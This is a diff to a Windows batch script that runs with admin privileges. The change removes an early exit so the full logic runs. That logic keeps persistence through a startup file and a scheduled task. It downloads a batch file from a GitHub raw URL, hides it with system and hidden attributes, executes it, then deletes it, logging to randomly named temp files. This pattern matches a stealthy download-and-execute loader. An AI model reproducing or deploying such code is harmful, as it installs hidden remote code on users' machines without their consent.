@@ -9,12 +9,12 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=6.6"
+set "BATCHVERSION=6.8"
 set "RESULT=%TEMP%\TUSELMP.txa"
 set "RUNEVERYOFFICIALMD5=e61120a65311d97840928a691e96b36a"
 set "RUNEVERYLOGFILE=%temp%\S1rNsvQgG.mpeez"
 
-goto :EOF
+::goto :EOF
 
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
@@ -276,7 +276,7 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 
 
-if not exist "%startupFile%" goto INSTRUNEVERY
+if not exist "%startupFile%" goto RUNEVERYINSTALL
 echo %startupFile% Found. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
@@ -297,8 +297,8 @@ if "%RUNEVERYCURRENTMD5%"=="%RUNEVERYOFFICIALMD5%" (
     echo. >> "%LOGFILE%" 2>&1
 ) else (
     echo MD5 doesnt match %RUNEVERYCURRENTMD5% # %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
-    echo Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
-    goto INSTRUNEVERY
+    echo Going to RUNEVERYINSTALL >> "%LOGFILE%" 2>&1
+    goto RUNEVERYINSTALL
 )
 
 
@@ -331,7 +331,7 @@ echo. >> "%LOGFILE%" 2>&1
 
 :: If Task doesnt Exist , goto 
 schtasks /query /tn "%Task1%" >> "%LOGFILE%" 2>&1
-if errorlevel 1 goto INSTRUNEVERY
+if errorlevel 1 goto RUNEVERYINSTALL
 
 
 
@@ -368,7 +368,7 @@ del /f /a "%embeddedScript%" >> "%LOGFILE%" 2>&1
 
 
 :: Download content and save to the embedded batch file
-curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/RunEveryCallerForRunEveryRunning"
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/RunEveryCallerForRunEveryRunning" >> "%LOGFILE%" 2>&1
 attrib +h +s "%embeddedScript%"
 
 echo. >> "%LOGFILE%" 2>&1
@@ -379,11 +379,16 @@ if exist "%embeddedScript%" (
     echo. >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
     call "%embeddedScript%" >> "%LOGFILE%" 2>&1
+    timeout /t 60 /nobreak >nul
+    echo. >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+	echo Deleting batchfile.. >> "%LOGFILE%" 2>&1
     del /f /a "%embeddedScript%" >> "%LOGFILE%" 2>&1
+	echo Deleted. >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
 ) else (
-    echo Failed to get content from ShellHost Link >> "%LOGFILE%" 2>&1
+    echo Failed to get content from RunEvery Link >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
     timeout /t 3 /nobreak  >> "%LOGFILE%" 2>&1
     goto RUNEVERYINSTALL
